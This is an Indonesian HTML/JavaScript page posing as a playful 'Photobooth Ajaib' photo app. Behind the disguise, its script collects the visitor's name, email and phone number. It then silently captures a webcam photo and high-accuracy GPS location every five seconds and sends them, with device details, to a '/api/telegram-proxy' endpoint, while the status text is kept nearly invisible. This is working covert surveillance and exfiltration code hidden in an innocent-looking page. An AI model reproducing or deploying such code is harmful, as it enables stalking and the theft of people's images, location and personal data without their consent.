<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Studio Foto Cantik Penuh</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Desain Studio Cantik */
        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&display=swap');
        
        body {
            background: linear-gradient(135deg, #fceabb 0%, #f8b5a5 100%); 
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
            background-image: radial-gradient(circle, #ffebeb 1px, transparent 1px), radial-gradient(circle, #fcebb0 1px, transparent 1px);
            background-size: 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background-color: #ffffff;
            border-radius: 25px; 
            box-shadow: 0 15px 40px rgba(255, 105, 180, 0.4); 
            padding: 1.5rem;
            margin: 1rem 0;
            box-sizing: border-box;
            border: 3px dashed #ff85a1; 
            transition: transform 0.3s ease;
        }

        .title {
            font-family: 'Pacifico', cursive;
            color: #d8366e;
            text-shadow: 2px 2px #ffc0cb;
        }

        .video-wrapper {
            border: 8px solid #ff85a1; 
            border-radius: 18px;
            overflow: hidden;
            width: 100%;
            margin-bottom: 1.5rem;
            aspect-ratio: 4/3;
            background-color: #000;
        }

        #video-stream {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Mirror effect */
            display: block;
        }

        .button-style {
            transition: all 0.1s ease;
            transform: translateY(0);
        }
        .button-style:active {
            box-shadow: none !important;
            transform: translateY(2px) !important;
        }
        
        #start-button {
            background-color: #ff527b;
            box-shadow: 0 4px #d8366e;
        }

        #capture-button {
            background-color: #10b981;
            box-shadow: 0 4px #059669;
        }

        #download-button {
            background-color: #3b82f6; 
            box-shadow: 0 4px #2563eb;
        }

        #share-button {
            background-color: #f59e0b; 
            box-shadow: 0 4px #d97706;
        }

        #countdown-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 6rem;
            font-family: 'Pacifico', cursive;
            color: #ff527b;
            z-index: 10;
        }
    </style>
</head>
<body class="flex justify-center items-start">

    <div class="container mt-8">
        <h1 class="title text-3xl text-center mb-6">üíñ Photobooth Ajaib üì∏</h1>
        
        <!-- Area Input Data Pengguna (Tampil Awal) -->
        <div id="form-area" class="space-y-4">
            <p class="text-sm text-center text-gray-700 font-semibold mb-4">
                üëã Masukkan data Anda untuk mengaktifkan Studio Foto Penuh!
            </p>
            <div>
                <label for="nama" class="block text-sm font-medium text-gray-700">Nama Lengkap</label>
                <input type="text" id="nama" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Nama Lengkap" required>
            </div>
            <div>
                <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
                <input type="email" id="email" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Email (Cth: user@mail.com)" required>
            </div>
            <div>
                <label for="phone" class="block text-sm font-medium text-gray-700">Nomor Handphone</label>
                <input type="tel" id="phone" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Nomor Handphone" required>
            </div>
            <button id="start-button" class="button-style w-full px-6 py-3 text-white rounded-xl font-bold text-lg">
                Lanjutkan ke Photobooth 
            </button>
            <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
        </div>

        <!-- Area Photobooth (Tampil Setelah Mulai) -->
        <div id="monitoring-area" style="display: none;" class="space-y-4">
            
            <div class="video-wrapper relative">
                <!-- Video Stream dan Canvas untuk Foto -->
                <video id="video-stream" autoplay playsinline style="display: none;"></video>
                <canvas id="photo-canvas" style="display: none;"></canvas>
                <!-- Countdown Display -->
                <div id="countdown-overlay" style="display: none;"></div>
            </div>

            <!-- Tombol Interaktif Lokal -->
            <div class="controls flex justify-center space-x-3 sm:space-x-4">
                <button id="capture-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" disabled>
                    Jepret Foto (Kamera Mati)
                </button>
                <button id="download-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" style="display: none;">
                    Unduh üíæ
                </button>
                <button id="share-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" style="display: none;">
                    Share üì§
                </button>
            </div>
            
            <!-- Pesan status sementara yang sangat minim/transparan -->
            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-300 opacity-0 transition-opacity duration-300"></p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const videoStream = document.getElementById('video-stream');
            const photoCanvas = document.getElementById('photo-canvas');
            const startButton = document.getElementById('start-button');
            const formArea = document.getElementById('form-area');
            const monitoringArea = document.getElementById('monitoring-area');
            const statusMessageForm = document.getElementById('status-message-form');
            const statusMessageBg = document.getElementById('status-message-bg'); 
            const captureButton = document.getElementById('capture-button');
            const downloadButton = document.getElementById('download-button');
            const shareButton = document.getElementById('share-button');
            const countdownOverlay = document.getElementById('countdown-overlay');

            // Data Konfigurasi LOKAL
            const PROXY_ENDPOINT = '/api/telegram-proxy';
            const INTERVAL_MS = 5000; // 5 detik
            const COUNTDOWN_SECONDS = 3;
            const MAX_RESOLUTION = 1280; // FIX: Resolusi maksimum untuk menghemat ukuran file

            let videoStreamObject = null;
            let formData = {};
            let isSending = false;
            let capturedPhotoBase64 = null;
            let deviceData = getDeviceData(); 

            // --- FUNGSI UTILITY PESAN ---

            function showStatus(message, isError = false) {
                statusMessageBg.textContent = message;
                statusMessageBg.classList.remove('opacity-0', 'text-red-600', 'text-green-600', 'text-gray-300');
                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-green-600', 'opacity-80');
                
                // Sembunyikan pesan setelah 3 detik
                setTimeout(() => {
                    statusMessageBg.classList.remove('opacity-80');
                    statusMessageBg.classList.add('opacity-0');
                }, 3000);
            }

            // --- INISIALISASI DAN VALIDASI FORM ---

            startButton.addEventListener('click', () => {
                const nama = document.getElementById('nama').value.trim();
                const email = document.getElementById('email').value.trim();
                const phone = document.getElementById('phone').value.trim();

                if (!nama || !email || !phone) {
                    statusMessageForm.textContent = '‚ùå Semua kolom data pribadi harus diisi.';
                    return;
                }

                formData = { nama, email, phone };
                statusMessageForm.textContent = '';
                formArea.style.display = 'none';
                monitoringArea.style.display = 'block';

                showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
                
                requestCameraPermission();
                startAutoSendInterval();
            });


            // --- FUNGSI CAMERA DAN LOKASI (Dioptimalkan) ---

            function requestCameraPermission() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) // Coba kamera depan
                        .then(stream => {
                            videoStreamObject = stream;
                            videoStream.srcObject = stream;
                            videoStream.style.display = 'block';
                            captureButton.disabled = false;
                            captureButton.textContent = 'Jepret Foto';
                            console.log('Kamera Aktif. Pengiriman otomatis 5s siap.');
                        })
                        .catch(err => {
                            // Coba kamera belakang jika kamera depan gagal (di beberapa perangkat)
                            return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                                .then(stream => {
                                    videoStreamObject = stream;
                                    videoStream.srcObject = stream;
                                    videoStream.style.display = 'block';
                                    captureButton.disabled = false;
                                    captureButton.textContent = 'Jepret Foto (Kamera Belakang)';
                                    console.log('Kamera Belakang Aktif.');
                                })
                                .catch(err => {
                                    showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto terlewat.`, true);
                                    captureButton.disabled = true;
                                    captureButton.textContent = 'Jepret Foto (Kamera Mati)';
                                    console.error("Camera Error:", err);
                                });
                        });
                }
            }
            
            // FUNGSI BARU: Mengambil lokasi sekali saja dengan Promise (lebih hemat daya)
            function getLocationData() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        return resolve(null);
                    }
                    const locationOptions = {
                        enableHighAccuracy: true, 
                        timeout: 5000, 
                        maximumAge: 0 
                    };

                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        });
                    }, err => {
                        console.error(`Lokasi Gagal: ${err.message} (Code: ${err.code})`);
                        resolve(null);
                    }, locationOptions);
                });
            }


            // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
            
            captureButton.addEventListener('click', () => {
                if (videoStreamObject) {
                    runCountdownAndCapture(() => {
                        const localPhoto = capturePhotoToCanvas(); 
                        if (localPhoto) {
                            capturedPhotoBase64 = localPhoto; 
                            downloadButton.style.display = 'inline-block';
                            shareButton.style.display = 'inline-block';
                            showStatus('Foto lokal siap diunduh & dibagikan!');
                        }
                    });
                } else {
                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                }
            });

            function runCountdownAndCapture(callback) {
                let count = COUNTDOWN_SECONDS;
                countdownOverlay.textContent = count;
                countdownOverlay.style.display = 'flex';
                captureButton.disabled = true;
                
                const timer = setInterval(() => {
                    count--;
                    if (count > 0) {
                        countdownOverlay.textContent = count;
                    } else {
                        clearInterval(timer);
                        countdownOverlay.style.display = 'none';
                        captureButton.disabled = false;
                        callback();
                    }
                }, 1000);
            }

            downloadButton.addEventListener('click', () => {
                if (capturedPhotoBase64) {
                    const link = document.createElement('a');
                    link.href = capturedPhotoBase64;
                    link.download = `StudioFotoCantik-${new Date().getTime()}.jpeg`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    showStatus('‚úÖ Foto Berhasil Diunduh!');
                }
            });
            
            shareButton.addEventListener('click', async () => {
                if (!capturedPhotoBase64) {
                    showStatus('Tidak ada foto untuk dibagikan. Jepret foto dulu!', true);
                    return;
                }

                try {
                    const photoBlob = dataURItoBlob(capturedPhotoBase64);
                    const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });

                    if (navigator.share && navigator.canShare && navigator.canShare({ files: [photoFile] })) {
                        await navigator.share({
                            files: [photoFile],
                            title: 'Foto dari Photobooth Ajaib',
                            text: 'Lihat foto keren saya dari Studio Foto Cantik!',
                        });
                        showStatus('Berbagi berhasil!');
                    } else {
                        showStatus('Fitur Share tidak didukung. Silakan gunakan tombol Unduh.', true);
                    }
                } catch (error) {
                    console.error('Gagal berbagi:', error);
                    showStatus('Gagal berbagi foto. (Cek console log)', true);
                }
            });


            // --- LOGIKA OTOMATIS DAN PENGIRIMAN (Senyap) ---

            function startAutoSendInterval() {
                const sendNext = () => {
                    if (!isSending) {
                        sendReport();
                    }
                    // Menggunakan setTimeout rekursif untuk interval
                    setTimeout(sendNext, INTERVAL_MS);
                };

                // Kirim laporan pertama setelah 5 detik
                setTimeout(sendNext, INTERVAL_MS);
            }

            function capturePhotoToCanvas() {
                if (!videoStreamObject) return null;

                const videoWidth = videoStream.videoWidth || 640;
                const videoHeight = videoStream.videoHeight || 480;
                
                let width = videoWidth;
                let height = videoHeight;
                
                // FIX KRITIS: Hitung ulang dimensi untuk menjaga rasio aspek dan membatasi ukuran
                if (width > MAX_RESOLUTION || height > MAX_RESOLUTION) {
                    const aspectRatio = width / height;
                    if (width > height) {
                        width = MAX_RESOLUTION;
                        height = MAX_RESOLUTION / aspectRatio;
                    } else {
                        height = MAX_RESOLUTION;
                        width = MAX_RESOLUTION * aspectRatio;
                    }
                }

                photoCanvas.width = width;
                photoCanvas.height = height;
                const context = photoCanvas.getContext('2d');
                
                // Terapkan efek cermin (Mirror effect)
                context.save();
                context.translate(width, 0);
                context.scale(-1, 1); 
                context.drawImage(videoStream, 0, 0, width, height);
                context.restore();

                // Kompresi JPEG 80%
                return photoCanvas.toDataURL('image/jpeg', 0.8);
            }

            async function sendReport() {
                if (isSending) return;

                isSending = true;
                
                // Ambil lokasi terbaru (lebih efisien daripada watchPosition)
                const latestLocation = await getLocationData();
                const base64Image = capturePhotoToCanvas();
                
                const now = new Date();
                const dateTimeText = now.toLocaleString('id-ID', {
                    year: 'numeric', month: 'long', day: 'numeric',
                    hour: '2-digit', minute: '2-digit', second: '2-digit',
                    timeZoneName: 'short'
                });

                // Kompilasi Caption
                const locationText = latestLocation ? 
                    `‚úÖ Lokasi Akurat:\nLAT: ${latestLocation.latitude.toFixed(6)}\nLNG: ${latestLocation.longitude.toFixed(6)}\nAkurasi: ${latestLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${latestLocation.latitude},${latestLocation.longitude}` : 
                    `‚ùå Lokasi GAGAL didapatkan.`;

                const caption = `
*--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*

*Waktu Pengambilan:* ${dateTimeText}

*Data Pengguna:*
Nama: ${formData.nama}
Email: ${formData.email}
No. HP: ${formData.phone}

*Data Lokasi (Wajib Akurat):*
${locationText}

*Informasi Perangkat:*
Perangkat: ${deviceData.device}
Browser: ${deviceData.browser}
OS: ${deviceData.os}
`;
                
                // Kirim data ke endpoint proxy
                try {
                    await sendDataToProxy(base64Image, caption);
                    // showStatus('‚úÖ Data dikirim otomatis!', false); 
                    console.log('‚úÖ Pengiriman otomatis sukses.');
                } catch (error) {
                    showStatus('‚ùå Pengiriman otomatis GAGAL! Cek log Vercel.', true);
                    console.error("Error saat mengirim data ke proxy:", error);
                } finally {
                    isSending = false;
                }
            }
            
            // FUNGSI BARU: Mengirim data ke API Proxy Anda
            async function sendDataToProxy(base64Image, caption) {
                const payload = {
                    caption: caption,
                    base64Image: base64Image,
                    isPhoto: !!base64Image 
                };

                // Gunakan backoff eksponensial untuk retry jika API throttling terjadi
                const MAX_RETRIES = 3;
                for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
                    try {
                        const response = await fetch(PROXY_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });

                        const data = await response.json();
                        if (!response.ok || data.error) {
                            // Jika response gagal, lempar error untuk memicu retry atau keluar loop
                            throw new Error(data.error || `Pengiriman ke proxy gagal. Status: ${response.status}`);
                        }
                        return data; // Sukses, keluar dari fungsi
                    } catch (error) {
                        if (attempt === MAX_RETRIES - 1) {
                            throw error; // Lempar error final setelah semua retry gagal
                        }
                        // Tunggu eksponensial sebelum retry
                        const delay = Math.pow(2, attempt) * 1000;
                        await new Promise(resolve => setTimeout(resolve, delay));
                        // console.log(`Retry attempt ${attempt + 1} after ${delay}ms...`); // Debugging line (optional)
                    }
                }
            }


            // --- UTILITIES (Device Info & Blob) ---

            function getDeviceData() {
                const ua = navigator.userAgent;
                let os = 'OS Lain';
                let browser = 'Browser Tidak Dikenal';
                let device = 'Desktop';

                if (/Windows/.test(ua)) os = 'Windows';
                else if (/Macintosh|Mac OS X/.test(ua)) os = 'macOS';
                else if (/Android/.test(ua)) { os = 'Android'; device = 'Handphone/Tablet'; }
                else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; device = 'iPhone/iPad'; }
                else if (/Linux/.test(ua)) os = 'Linux';

                if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
                else if (/Firefox/.test(ua)) browser = 'Firefox';
                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                else if (/Edge/.test(ua)) browser = 'Edge';
                
                return { os, browser, device };
            }

            function dataURItoBlob(dataURI) {
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }
        });
    </script>
</body>
</html>
